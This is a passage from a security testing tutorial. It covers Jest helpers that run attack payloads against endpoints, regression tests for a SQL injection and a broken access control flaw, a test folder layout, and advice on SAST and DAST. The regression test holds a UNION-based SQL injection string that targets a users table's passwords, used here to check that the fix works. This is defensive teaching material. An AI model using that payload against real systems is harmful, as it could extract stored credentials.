// Helper to test all payloads for a given vulnerability class
function testPayloads(payloadType, testFn) {
  describe(`${payloadType} payload testing`, () => {
    test.each(attackPayloads[payloadType])(
      'prevents attack with payload: %s',
      async (payload) => {
        await testFn(payload)
      }
    )
  })
}

module.exports = { attackPayloads, testPayloads }
```

**Usage**:

```javascript
const { attackPayloads, testPayloads } = require('./fixtures/attackPayloads')

testPayloads('sqlInjection', async (payload) => {
  const response = await request
    .get(`/api/search?q=${encodeURIComponent(payload)}`)

  expect(response.status).not.toBe(500)
  expect(response.body.length).toBeLessThan(100)
})
```

## Security Regression Testing

When you fix a vulnerability, capture it as a test so it never returns.

```javascript
// After fixing CVE-2024-XXXX (SQL injection in search endpoint)
describe('Security Regression Tests', () => {

  test('CVE-2024-XXXX: SQL injection in search endpoint', async () => {
    // The specific payload that exploited the vulnerability
    const payload = "' UNION SELECT password FROM users WHERE '1'='1"

    const response = await request
      .get(`/api/search?q=${encodeURIComponent(payload)}`)

    // Should not return sensitive data
    expect(response.status).not.toBe(500)
    expect(response.body).not.toContainEqual(
      expect.objectContaining({ password: expect.anything() })
    )

    // Verify the fix: parameterized queries used
    const searchCode = await fs.readFile('src/api/search.js', 'utf8')
    expect(searchCode).toContain('db.query(')
    expect(searchCode).toContain('?')
  })

  test('CVE-2024-YYYY: Broken access control on user profiles', async () => {
    const user1 = await createTestUser('user1@example.com')
    const user2 = await createTestUser('user2@example.com')

    // The specific exploit: changing user ID in URL
    const response = await request
      .get(`/api/users/${user2.id}/profile`)
      .set('Authorization', `Bearer ${user1.token}`)

    expect(response.status).toBe(403)

    // Verify audit logging of access attempt
    const logs = await db.auditLogs.find({
      action: 'unauthorized_access_attempt',
      userId: user1.id,
      resourceId: user2.id
    })

    expect(logs.length).toBeGreaterThan(0)
  })
})
```

## Security Test Organization

```
tests/
├── security/
│   ├── access-control/
│   │   ├── horizontal-privilege-escalation.test.js
│   │   ├── vertical-privilege-escalation.test.js
│   │   ├── idor.test.js
│   │   └── missing-function-level-access.test.js
│   │
│   ├── authentication/
│   │   ├── password-policy.test.js
│   │   ├── session-management.test.js
│   │   ├── brute-force-protection.test.js
│   │   └── mfa.test.js
│   │
│   ├── injection/
│   │   ├── sql-injection.test.js
│   │   ├── nosql-injection.test.js
│   │   ├── command-injection.test.js
│   │   ├── ldap-injection.test.js
│   │   └── template-injection.test.js
│   │
│   ├── cryptography/
│   │   ├── password-hashing.test.js
│   │   ├── encryption-at-rest.test.js
│   │   ├── tls-configuration.test.js
│   │   └── token-generation.test.js
│   │
│   ├── configuration/
│   │   ├── security-headers.test.js
│   │   ├── error-handling.test.js
│   │   ├── cors.test.js
│   │   └── default-credentials.test.js
│   │
│   ├── data-protection/
│   │   ├── sensitive-data-exposure.test.js
│   │   ├── pii-handling.test.js
│   │   └── data-retention.test.js
│   │
│   ├── regression/
│   │   ├── cve-2024-xxxx.test.js
│   │   └── historical-vulnerabilities.test.js
│   │
│   └── fixtures/
│       ├── secureTestData.js
│       ├── attackPayloads.js
│       └── testUsers.js
```

## What's Next

This mid-depth layer gives you production-ready security testing:
- Complete OWASP Top 10 coverage with automated tests
- SAST/DAST integrated into CI/CD for continuous security testing
- Shift-left practices that catch vulnerabilities early
- Test data management that keeps you compliant
- Security regression tests that prevent vulnerabilities from returning

When you need more:

**Deep-Water Security Testing** covers:
- Penetration testing and red team exercises
- Bug bounty program setup and management
- Advanced threat scenarios (supply chain attacks, zero-days)
- Security testing at scale (microservices, distributed systems)
- Enterprise security audit preparation (SOC 2 Type II, ISO 27001)

**Related Topics**:
- **Threat Modeling**: Design secure systems from the start - security testing validates threat model assumptions
- **Secure Coding Practices**: Prevention is cheaper than testing - write secure code by default
- **Compliance Validation**: Security testing creates evidence for compliance audits
- **CI/CD Pipelines**: Security testing automation depends on solid CI/CD infrastructure

---

The difference between surface and mid-depth security testing is the difference between "we checked for common vulnerabilities" and "we have a repeatable security testing process that scales with our team."

SAST catches vulnerabilities during code review. DAST validates your deployed security. Both integrated into CI/CD mean security testing happens automatically, not as an afterthought before launch.

Start with the testing pipeline in this guide. Run it on every commit. Review findings weekly. Fix high/critical issues before they reach production. That's production-ready security testing.